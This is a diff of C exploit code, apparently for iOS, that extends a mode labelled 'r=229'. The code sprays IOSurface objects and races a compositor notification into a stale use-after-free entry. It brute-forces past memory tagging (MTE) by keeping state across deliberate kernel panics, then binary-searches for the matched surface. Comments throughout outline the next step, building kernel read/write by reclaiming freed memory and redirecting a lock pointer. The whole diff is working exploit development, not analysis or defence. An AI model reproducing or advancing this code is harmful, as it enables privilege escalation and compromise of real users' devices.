@@ -19341,43 +19341,55 @@ new_modes:
             int r229_spray_n = 0;
             int r229_attempt = 0;
             int r229_crash_count = 0;
+            int r229_phase = 0;
+            int r229_bsearch_lo = 0, r229_bsearch_hi = 255;
             CFMutableDictionaryRef r229_sp = NULL;
             if (rounds == 229) {
                 char state_path[512];
                 snprintf(state_path, sizeof(state_path), "%s/Documents/r229_state.bin",
                     getenv("HOME") ? getenv("HOME") : "/var/mobile");
-                /* State file layout: [attempt(4)] [crash_count(4)] [survived_last(4)] */
+                /* State v2: [attempt(4)][crash_count(4)][survived(4)][phase(4)][bsearch_lo(4)][bsearch_hi(4)] = 24 bytes */
                 int r229_survived_last = 1;
                 int rfd = open(state_path, O_RDONLY);
                 if (rfd >= 0) {
                     struct stat st;
                     fstat(rfd, &st);
-                    if (st.st_size >= 12) {
+                    if (st.st_size >= 24) {
+                        read(rfd, &r229_attempt, sizeof(int));
+                        read(rfd, &r229_crash_count, sizeof(int));
+                        read(rfd, &r229_survived_last, sizeof(int));
+                        read(rfd, &r229_phase, sizeof(int));
+                        read(rfd, &r229_bsearch_lo, sizeof(int));
+                        read(rfd, &r229_bsearch_hi, sizeof(int));
+                    } else if (st.st_size >= 12) {
                         read(rfd, &r229_attempt, sizeof(int));
                         read(rfd, &r229_crash_count, sizeof(int));
                         read(rfd, &r229_survived_last, sizeof(int));
                     } else if (st.st_size >= 4) {
                         read(rfd, &r229_attempt, sizeof(int));
-                        r229_crash_count = 0;
-                        r229_survived_last = 0;
                     }
                     close(rfd);
                 }
                 if (!r229_survived_last) r229_crash_count++;
                 r229_attempt++;
                 /* Write state with survived=0; force sync to survive kernel panics */
-                int zero = 0;
-                int state_fd = open(state_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-                if (state_fd >= 0) {
-                    write(state_fd, &r229_attempt, sizeof(int));
-                    write(state_fd, &r229_crash_count, sizeof(int));
-                    write(state_fd, &zero, sizeof(int));
-                    fsync(state_fd);
-                    close(state_fd);
+                {
+                    int zero = 0;
+                    int state_fd = open(state_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                    if (state_fd >= 0) {
+                        write(state_fd, &r229_attempt, sizeof(int));
+                        write(state_fd, &r229_crash_count, sizeof(int));
+                        write(state_fd, &zero, sizeof(int));
+                        write(state_fd, &r229_phase, sizeof(int));
+                        write(state_fd, &r229_bsearch_lo, sizeof(int));
+                        write(state_fd, &r229_bsearch_hi, sizeof(int));
+                        fsync(state_fd);
+                        close(state_fd);
+                    }
+                    sync();
                 }
-                sync();
-                rlog("  r=229: MTE brute-force attempt #%d (crashes=%d, 1/16 per race win)\n",
-                    r229_attempt, r229_crash_count);
+                rlog("  r=229: MTE brute-force attempt #%d (crashes=%d phase=%d bsearch=[%d,%d])\n",
+                    r229_attempt, r229_crash_count, r229_phase, r229_bsearch_lo, r229_bsearch_hi);
 
                 r229_sp = CFDictionaryCreateMutable(NULL, 0,
                     &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
@@ -19695,143 +19707,52 @@ new_modes:
 
             /* Stop render loop */
             if (rounds == 229) {
-                rlog("  r=229: SURVIVED Phase 13 attempt #%d! spray=%d frames=%d wps=%d\n",
-                    r229_attempt, r229_spray_n, p13_render_frames, r229_wp_n);
+                rlog("  r=229: SURVIVED Phase 13 attempt #%d! spray=%d frames=%d wps=%d phase=%d\n",
+                    r229_attempt, r229_spray_n, p13_render_frames, r229_wp_n, r229_phase);
 
-                /* === DETECTION PHASE (4 methods, non-destructive first) ===
-                 *
-                 * 1. Mach port msgs: wake port received async notification.
-                 * 2. Property delta: seed/use-count/alloc-size changed.
-                 * 3. Survival burn: crash_count>=5 + surviving 3s of compositor.
-                 * 4. Refcount probe (DESTRUCTIVE): release spray, IOSurfaceLookup
-                 *    for survivors — if sel17 retained via stale pointer & MTE
-                 *    matched, the surface has extra refcount and survives release.
-                 */
-
-                /* Snapshot spray surface IDs and baseline properties */
+                /* Snapshot spray surface IDs */
                 IOSurfaceID r229_ids[256];
-                uint32_t r229_seed0[256];
-                int r229_use0[256];
-                size_t r229_alloc0[256];
                 for (int si = 0; si < 256; si++) {
-                    if (r229_spray[si]) {
-                        r229_ids[si] = IOSurfaceGetID(r229_spray[si]);
-                        r229_seed0[si] = IOSurfaceGetSeed(r229_spray[si]);
-                        r229_use0[si] = IOSurfaceGetUseCount(r229_spray[si]);
-                        r229_alloc0[si] = IOSurfaceGetAllocSize(r229_spray[si]);
-                    } else {
-                        r229_ids[si] = 0;
-                    }
+                    r229_ids[si] = r229_spray[si] ? IOSurfaceGetID(r229_spray[si]) : 0;
                 }
 
-                /* Method 1: Check all retained wake ports for messages */
-                int r229_wp_msgs = 0;
-                int r229_wp_msg_idx = -1;
-                for (int wi = 0; wi < r229_wp_n; wi++) {
-                    uint8_t msg_buf[256];
-                    mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
-                    memset(msg_buf, 0, sizeof(msg_buf));
-                    hdr->msgh_size = sizeof(msg_buf);
-                    hdr->msgh_local_port = r229_wps[wi];
-                    kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
-                        0, sizeof(msg_buf), r229_wps[wi], 0, MACH_PORT_NULL);
-                    if (mr == MACH_MSG_SUCCESS) {
-                        r229_wp_msgs++;
-                        if (r229_wp_msg_idx < 0) r229_wp_msg_idx = wi;
-                        rlog("  !!! WAKE PORT [%d] received message! id=0x%x\n",
-                            wi, hdr->msgh_id);
-                    }
-                }
-                rlog("  r=229: Wake port scan: %d/%d had messages\n",
-                    r229_wp_msgs, r229_wp_n);
+                int r229_mte_match = 0;
+                int r229_match_idx = -1;
 
-                /* 1.5s soak for more dispatch traversals */
-                rlog("  r=229: Waiting 1.5s for dispatch accumulation...\n");
-                usleep(1500000);
-                rlog("  r=229: Render frames after soak: %d\n", p13_render_frames);
-
-                /* Method 2: Property delta check */
-                int r229_prop_hit = 0;
-                for (int si = 0; si < 256; si++) {
-                    if (!r229_spray[si]) continue;
-                    uint32_t seed1 = IOSurfaceGetSeed(r229_spray[si]);
-                    int use1 = IOSurfaceGetUseCount(r229_spray[si]);
-                    size_t alloc1 = IOSurfaceGetAllocSize(r229_spray[si]);
-                    if (seed1 != r229_seed0[si]) {
-                        rlog("  !!! SEED DELTA spray[%d] id=%u: %u->%u\n",
-                            si, r229_ids[si], r229_seed0[si], seed1);
-                        r229_prop_hit = 1;
-                    }
-                    if (use1 != r229_use0[si]) {
-                        rlog("  !!! USE COUNT DELTA spray[%d] id=%u: %d->%d\n",
-                            si, r229_ids[si], r229_use0[si], use1);
-                        r229_prop_hit = 1;
-                    }
-                    if (alloc1 != r229_alloc0[si]) {
-                        rlog("  !!! ALLOC SIZE DELTA spray[%d] id=%u: %zu->%zu\n",
-                            si, r229_ids[si], r229_alloc0[si], alloc1);
-                        r229_prop_hit = 1;
-                    }
-                }
-                if (!r229_prop_hit)
-                    rlog("  r=229: No property deltas (expected).\n");
-
-                /* Second wake-port sweep after soak */
-                for (int wi = 0; wi < r229_wp_n; wi++) {
-                    uint8_t msg_buf[256];
-                    mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
-                    memset(msg_buf, 0, sizeof(msg_buf));
-                    hdr->msgh_size = sizeof(msg_buf);
-                    hdr->msgh_local_port = r229_wps[wi];
-                    kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
-                        0, sizeof(msg_buf), r229_wps[wi], 0, MACH_PORT_NULL);
-                    if (mr == MACH_MSG_SUCCESS) {
-                        r229_wp_msgs++;
-                        if (r229_wp_msg_idx < 0) r229_wp_msg_idx = wi;
-                        rlog("  !!! WAKE PORT [%d] msg on 2nd sweep! id=0x%x\n",
-                            wi, hdr->msgh_id);
-                    }
-                }
-
-                /* Method 3: Survival burn (non-destructive, surfaces alive) */
-                int r229_survival_match = 0;
-                if (r229_wp_msgs == 0 && !r229_prop_hit && r229_crash_count >= 5) {
-                    rlog("  r=229: %d crashes confirm race wins. 3s burn...\n",
-                        r229_crash_count);
-                    int fb = p13_render_frames;
-                    usleep(3000000);
-                    int burn = p13_render_frames - fb;
-                    rlog("  r=229: Burn: %d frames, still alive.\n", burn);
-                    if (burn > 90)
-                        r229_survival_match = 1;
-                }
-
-                /* Save state before destructive probe */
-                {
-                    char state_path[512];
-                    snprintf(state_path, sizeof(state_path), "%s/Documents/r229_state.bin",
-                        getenv("HOME") ? getenv("HOME") : "/var/mobile");
-                    int one = 1;
-                    int sfd = open(state_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-                    if (sfd >= 0) {
-                        write(sfd, &r229_attempt, sizeof(int));
-                        write(sfd, &r229_crash_count, sizeof(int));
-                        write(sfd, &one, sizeof(int));
-                        fsync(sfd);
-                        close(sfd);
-                    }
-                }
-
-                /* Method 4: Refcount probe (DESTRUCTIVE — releases spray)
-                 * After CFRelease, if a stale entry retained our surface via
-                 * the matched-MTE pointer, the surface has refcount > 0 and
-                 * stays in the global IOSurface registry.
-                 */
-                int r229_refcount_hit = -1;
-                IOSurfaceRef r229_held = NULL;
-                if (r229_wp_msgs == 0 && !r229_prop_hit && !r229_survival_match) {
-                    rlog("  r=229: Refcount probe: releasing %d surfaces...\n",
+                if (r229_phase == 0 && r229_crash_count >= 3) {
+                    /* === PHASE 0: Destructive crash probe ===
+                     * We know races fire (crash_count >= 3).
+                     * Free ALL spray surfaces. If a stale entry points to one,
+                     * the next compositor dispatch reads freed GEN1 memory →
+                     * MTE tag mismatch → kernel panic. If we survive 2s,
+                     * no match this attempt.
+                     */
+                    rlog("  r=229: DESTRUCTIVE PROBE: freeing %d spray surfaces...\n",
                         r229_spray_n);
+
+                    /* Save state: survived=0, keep phase=0.
+                     * If we crash here, next launch knows probe crashed = match confirmed.
+                     * We set phase=1 so next launch enters binary search. */
+                    {
+                        char sp[512];
+                        snprintf(sp, sizeof(sp), "%s/Documents/r229_state.bin",
+                            getenv("HOME") ? getenv("HOME") : "/var/mobile");
+                        int zero = 0, next_phase = 1;
+                        int sfd = open(sp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                        if (sfd >= 0) {
+                            write(sfd, &r229_attempt, sizeof(int));
+                            write(sfd, &r229_crash_count, sizeof(int));
+                            write(sfd, &zero, sizeof(int));
+                            write(sfd, &next_phase, sizeof(int));
+                            int lo = 0, hi = 255;
+                            write(sfd, &lo, sizeof(int));
+                            write(sfd, &hi, sizeof(int));
+                            fsync(sfd);
+                            close(sfd);
+                        }
+                        sync();
+                    }
+
                     for (int si = 0; si < 256; si++) {
                         if (r229_spray[si]) {
                             CFRelease(r229_spray[si]);
@@ -19839,89 +19760,214 @@ new_modes:
                         }
                     }
                     r229_spray_n = 0;
-                    usleep(300000);
 
-                    for (int si = 0; si < 256; si++) {
-                        if (!r229_ids[si]) continue;
-                        IOSurfaceRef probe = IOSurfaceLookup(r229_ids[si]);
-                        if (probe) {
-                            rlog("  !!! REFCOUNT PROBE: spray[%d] id=%u SURVIVED!\n",
-                                si, r229_ids[si]);
-                            r229_refcount_hit = si;
-                            r229_held = probe;
-                            break;
+                    rlog("  r=229: Spray freed. Waiting 2s for compositor crash...\n");
+                    usleep(2000000);
+                    rlog("  r=229: SURVIVED probe — no MTE match this attempt.\n");
+
+                    /* Survived probe = no match. Reset phase to 0, mark survived. */
+                    {
+                        char sp[512];
+                        snprintf(sp, sizeof(sp), "%s/Documents/r229_state.bin",
+                            getenv("HOME") ? getenv("HOME") : "/var/mobile");
+                        int one = 1, zero = 0;
+                        int sfd = open(sp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                        if (sfd >= 0) {
+                            write(sfd, &r229_attempt, sizeof(int));
+                            write(sfd, &r229_crash_count, sizeof(int));
+                            write(sfd, &one, sizeof(int));
+                            write(sfd, &zero, sizeof(int));
+                            int lo = 0, hi = 255;
+                            write(sfd, &lo, sizeof(int));
+                            write(sfd, &hi, sizeof(int));
+                            fsync(sfd);
+                            close(sfd);
                         }
+                        sync();
                     }
-                    if (r229_refcount_hit < 0)
-                        rlog("  r=229: Refcount probe: no survivors.\n");
-                }
 
-                /* Final decision */
-                int r229_mte_match = 0;
-                if (r229_wp_msgs > 0) {
-                    rlog("  !!! MTE MATCH via Mach port message!\n");
-                    r229_mte_match = 1;
-                } else if (r229_prop_hit) {
-                    rlog("  !!! MTE MATCH via property delta!\n");
-                    r229_mte_match = 1;
-                } else if (r229_refcount_hit >= 0) {
-                    rlog("  !!! MTE MATCH via refcount probe!\n");
-                    r229_mte_match = 1;
-                } else if (r229_survival_match) {
-                    rlog("  r=229: MTE MATCH (tentative) via survival burn.\n");
-                    r229_mte_match = 1;
+                } else if (r229_phase == 0 && r229_crash_count < 3) {
+                    rlog("  r=229: Only %d crashes, need >= 3 for probe. Looping...\n",
+                        r229_crash_count);
+                    /* Mark survived for crash tracking */
+                    {
+                        char sp[512];
+                        snprintf(sp, sizeof(sp), "%s/Documents/r229_state.bin",
+                            getenv("HOME") ? getenv("HOME") : "/var/mobile");
+                        int one = 1;
+                        int sfd = open(sp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                        if (sfd >= 0) {
+                            write(sfd, &r229_attempt, sizeof(int));
+                            write(sfd, &r229_crash_count, sizeof(int));
+                            write(sfd, &one, sizeof(int));
+                            write(sfd, &r229_phase, sizeof(int));
+                            write(sfd, &r229_bsearch_lo, sizeof(int));
+                            write(sfd, &r229_bsearch_hi, sizeof(int));
+                            fsync(sfd);
+                            close(sfd);
+                        }
+                        sync();
+                    }
+
+                } else if (r229_phase == 1) {
+                    /* === PHASE 1: Binary search for matched surface ===
+                     * Previous launch's destructive probe crashed = confirmed MTE match.
+                     * Now re-race, re-spray, and binary search to find WHICH surface.
+                     */
+                    rlog("  r=229: BINARY SEARCH phase: range [%d, %d]\n",
+                        r229_bsearch_lo, r229_bsearch_hi);
+
+                    if (r229_bsearch_lo == r229_bsearch_hi) {
+                        rlog("  !!! r=229: Binary search CONVERGED on spray[%d] id=%u!\n",
+                            r229_bsearch_lo,
+                            r229_spray[r229_bsearch_lo] ? IOSurfaceGetID(r229_spray[r229_bsearch_lo]) : 0);
+                        r229_mte_match = 1;
+                        r229_match_idx = r229_bsearch_lo;
+                    } else {
+                        int mid = (r229_bsearch_lo + r229_bsearch_hi) / 2;
+                        rlog("  r=229: Freeing spray[%d..%d], keeping [%d..%d]\n",
+                            r229_bsearch_lo, mid, mid + 1, r229_bsearch_hi);
+
+                        /* Save state: if we crash, match was in [lo, mid] */
+                        {
+                            char sp[512];
+                            snprintf(sp, sizeof(sp), "%s/Documents/r229_state.bin",
+                                getenv("HOME") ? getenv("HOME") : "/var/mobile");
+                            int zero = 0, phase1 = 1;
+                            int sfd = open(sp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                            if (sfd >= 0) {
+                                write(sfd, &r229_attempt, sizeof(int));
+                                write(sfd, &r229_crash_count, sizeof(int));
+                                write(sfd, &zero, sizeof(int));
+                                write(sfd, &phase1, sizeof(int));
+                                write(sfd, &r229_bsearch_lo, sizeof(int));
+                                write(sfd, &mid, sizeof(int));
+                                fsync(sfd);
+                                close(sfd);
+                            }
+                            sync();
+                        }
+
+                        /* Free the lower half */
+                        for (int si = r229_bsearch_lo; si <= mid; si++) {
+                            if (r229_spray[si]) {
+                                CFRelease(r229_spray[si]);
+                                r229_spray[si] = NULL;
+                            }
+                        }
+
+                        rlog("  r=229: Freed lower half. Waiting 1.5s...\n");
+                        usleep(1500000);
+
+                        /* Survived = match is in upper half [mid+1, hi] */
+                        rlog("  r=229: Survived! Match in [%d, %d]\n", mid + 1, r229_bsearch_hi);
+                        r229_bsearch_lo = mid + 1;
+
+                        /* Continue binary search in-process */
+                        while (r229_bsearch_lo < r229_bsearch_hi) {
+                            mid = (r229_bsearch_lo + r229_bsearch_hi) / 2;
+                            rlog("  r=229: Narrowing: free [%d..%d], keep [%d..%d]\n",
+                                r229_bsearch_lo, mid, mid + 1, r229_bsearch_hi);
+
+                            /* Save state for crash case */
+                            {
+                                char sp[512];
+                                snprintf(sp, sizeof(sp), "%s/Documents/r229_state.bin",
+                                    getenv("HOME") ? getenv("HOME") : "/var/mobile");
+                                int zero = 0, phase1 = 1;
+                                int sfd = open(sp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                                if (sfd >= 0) {
+                                    write(sfd, &r229_attempt, sizeof(int));
+                                    write(sfd, &r229_crash_count, sizeof(int));
+                                    write(sfd, &zero, sizeof(int));
+                                    write(sfd, &phase1, sizeof(int));
+                                    write(sfd, &r229_bsearch_lo, sizeof(int));
+                                    write(sfd, &mid, sizeof(int));
+                                    fsync(sfd);
+                                    close(sfd);
+                                }
+                                sync();
+                            }
+
+                            for (int si = r229_bsearch_lo; si <= mid; si++) {
+                                if (r229_spray[si]) {
+                                    CFRelease(r229_spray[si]);
+                                    r229_spray[si] = NULL;
+                                }
+                            }
+
+                            usleep(1500000);
+                            rlog("  r=229: Survived! Match in [%d, %d]\n",
+                                mid + 1, r229_bsearch_hi);
+                            r229_bsearch_lo = mid + 1;
+                        }
+
+                        rlog("  !!! r=229: Binary search CONVERGED on spray[%d] id=%u!\n",
+                            r229_bsearch_lo,
+                            r229_spray[r229_bsearch_lo] ? IOSurfaceGetID(r229_spray[r229_bsearch_lo]) : 0);
+                        r229_mte_match = 1;
+                        r229_match_idx = r229_bsearch_lo;
+                    }
                 }
 
                 if (r229_mte_match) {
                     rlog("\n  ========================================\n");
                     rlog("  === MTE BRUTE-FORCE SUCCESS (attempt #%d) ===\n", r229_attempt);
                     rlog("  ========================================\n");
-                    rlog("  spray=%d wps=%d crashes=%d\n",
-                        r229_spray_n, r229_wp_n, r229_crash_count);
-                    rlog("  signals: wp=%d prop=%d refcount=%d survival=%d\n",
-                        r229_wp_msgs, r229_prop_hit, r229_refcount_hit,
-                        r229_survival_match);
+                    rlog("  matched spray[%d] id=%u addr=%p\n",
+                        r229_match_idx,
+                        r229_spray[r229_match_idx] ? IOSurfaceGetID(r229_spray[r229_match_idx]) : 0,
+                        r229_spray[r229_match_idx] ? (void *)r229_spray[r229_match_idx] : NULL);
+                    rlog("  crashes=%d phase=%d\n", r229_crash_count, r229_phase);
 
+                    /* Keep the matched surface alive, free everything else */
                     for (int si = 0; si < 256; si++) {
-                        if (!r229_spray[si]) continue;
-                        rlog("  spray[%d]: id=%u addr=%p\n", si,
-                            IOSurfaceGetID(r229_spray[si]),
-                            (void *)r229_spray[si]);
-                    }
-                    if (r229_held) {
-                        rlog("  refcount survivor: id=%u addr=%p\n",
-                            r229_ids[r229_refcount_hit], (void *)r229_held);
-                    }
-
-                    rlog("  r=229: Surfaces and ports kept alive.\n");
-                    rlog("  r=229: Proceeding to kernel R/W construction...\n");
-
-                    {
-                        char cp[512];
-                        snprintf(cp, sizeof(cp), "%s/Documents/r229_state.bin",
-                            getenv("HOME") ? getenv("HOME") : "/var/mobile");
-                        int zz = 0, one = 1;
-                        int cfd = open(cp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-                        if (cfd >= 0) {
-                            write(cfd, &r229_attempt, sizeof(int));
-                            write(cfd, &zz, sizeof(int));
-                            write(cfd, &one, sizeof(int));
-                            fsync(cfd);
-                            close(cfd);
+                        if (si == r229_match_idx) continue;
+                        if (r229_spray[si]) {
+                            CFRelease(r229_spray[si]);
+                            r229_spray[si] = NULL;
                         }
                     }
+                    for (int wi = 0; wi < r229_wp_n; wi++) {
+                        if (r229_wps[wi]) mach_port_deallocate(mach_task_self(), r229_wps[wi]);
+                    }
+                    r229_wp_n = 0;
+
+                    /* Reset state file */
+                    {
+                        char sp[512];
+                        snprintf(sp, sizeof(sp), "%s/Documents/r229_state.bin",
+                            getenv("HOME") ? getenv("HOME") : "/var/mobile");
+                        int zero = 0, one = 1;
+                        int sfd = open(sp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                        if (sfd >= 0) {
+                            write(sfd, &r229_attempt, sizeof(int));
+                            write(sfd, &zero, sizeof(int));
+                            write(sfd, &one, sizeof(int));
+                            write(sfd, &zero, sizeof(int));
+                            write(sfd, &zero, sizeof(int));
+                            write(sfd, &zero, sizeof(int));
+                            fsync(sfd);
+                            close(sfd);
+                        }
+                        sync();
+                    }
+
+                    rlog("  r=229: Matched surface kept alive. Proceeding to Phase 14...\n");
 
                     /* TODO: Phase 14 — kernel R/W primitive construction
-                     * The stale notification entry points to one of our spray surfaces.
-                     * Every compositor frame, dispatch locks spray_surface+0xD8 and
-                     * calls inner(spray_surface, data, stack_buf).
-                     * Next steps:
-                     * 1. Identify which spray surface via binary search (free half, check survival)
-                     * 2. Control IOSurface object fields at +0xD8, +0x108, +0x110, +0x118
-                     * 3. Redirect lock pointer to gain controlled write primitive
-                     * 4. Build arbitrary kernel R/W from controlled dispatch
+                     * The stale notification entry points to r229_spray[r229_match_idx].
+                     * Every compositor frame, dispatch reads surface+0xD8 (lock),
+                     * calls inner(surface, data, &buf) which returns 0 (no callbacks).
+                     *
+                     * Attack plan:
+                     * 1. We control the matched IOSurface via userspace APIs
+                     * 2. The stale entry's dispatch accesses our surface each frame
+                     * 3. Free the matched surface, reclaim with controlled data to
+                     *    redirect the lock pointer at +0xD8 → controlled write
+                     * 4. Or: set callback_count (+0x110) > 0 via Metal compositor
+                     *    registration to make inner() follow our callback array
                      */
-                    if (r229_held) CFRelease(r229_held);
                 } else {
                     /* Clean up any remaining spray surfaces */
                     for (int si = 0; si < 256; si++) {
@@ -19937,9 +19983,9 @@ new_modes:
                     }
                     r229_wp_n = 0;
 
-                    if (r229_attempt < 100) {
-                        rlog("  r=229: No match, looping (%d/100, crashes=%d)...\n",
-                            r229_attempt, r229_crash_count);
+                    if (r229_attempt < 200) {
+                        rlog("  r=229: No match, looping (%d/200, crashes=%d phase=%d)...\n",
+                            r229_attempt, r229_crash_count, r229_phase);
                         p13_render_run = 0;
                         pthread_join(render_th, NULL);
                         p13_free_groom();
